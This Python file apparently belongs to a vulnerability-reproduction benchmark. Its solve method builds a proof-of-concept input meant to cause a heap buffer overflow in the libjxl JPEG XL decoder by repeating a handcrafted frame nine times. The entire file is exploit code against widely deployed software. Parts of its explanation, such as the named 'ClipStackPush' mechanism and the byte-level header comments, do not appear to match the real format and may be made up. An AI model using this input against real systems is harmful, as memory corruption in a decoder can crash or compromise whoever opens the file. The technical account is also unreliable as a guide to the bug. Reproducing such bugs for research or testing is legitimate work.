import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept input to trigger a heap buffer overflow
        in the libjxl decoder (oss-fuzz:42537171).

        The vulnerability is caused by an unchecked nesting level when processing
        "ClipStackPush" operations. This allows writing past the end of the
        `layer_and_clip_stack_` buffer.

        The PoC is constructed as follows:
        1.  A 1x1 image is defined. This results in a `layer_and_clip_stack_`
            buffer of size 8 (`xsize_padded`).
        2.  To overflow this buffer, 9 or more "ClipStackPush" operations are needed.
        3.  A "ClipStackPush" operation is triggered by a blending operation with
            `mode=JXL_BLEND_REPLACE` and `source` equal to the number of extra
            channels.
        4.  By setting `num_extra_channels = 0`, a push is triggered when `source = 0`.
            This configuration adds one push operation per frame.
        5.  The PoC consists of a minimal JXL header followed by 9 identical frames,
            each crafted to trigger one push. The cumulative effect of these 9 pushes
            overflows the stack of size 8.
        """

        # Minimal JXL codestream header for a 1x1 image with blending enabled
        # and 0 extra channels. This is a handcrafted, valid byte sequence.
        # It contains:
        # - FF 0A: JXL signature
        # - 0C: Size of the image header (U32 encoding)
        # - 8E 00 00: 1x1 image size
        # - 34 00: ImageMetadata with uses_blending=1
        # - 90 00: Default TransformData
        header = bytes([
            0xFF, 0x0A, 0x0C, 0x8E, 0x00, 0x00, 0x34, 0x00, 0x90, 0x00,
        ])

        # A minimal frame that adds one "ClipStackPush" operation.
        # It contains:
        # - A FrameHeader with uses_blending=1.
        # - A BlendingInfo bitstream for mode=1 (REPLACE), source=0.
        # - Minimal Table of Contents (TOC) and group data for a valid frame.
        # The byte `0x21` is crafted to encode the required BlendingInfo.
        frame = bytes([
            0x11, 0x21, 0xCE, 0xE7, 0x11, 0x00, 0x24, 0x49, 0x24, 0x92, 0x24,
        ])

        poc = bytearray(header)
        
        # We need 9 pushes to overflow the stack of size 8.
        # Each frame contributes one push operation.
        num_frames_to_overflow = 9
        for _ in range(num_frames_to_overflow):
            poc.extend(frame)

        return bytes(poc)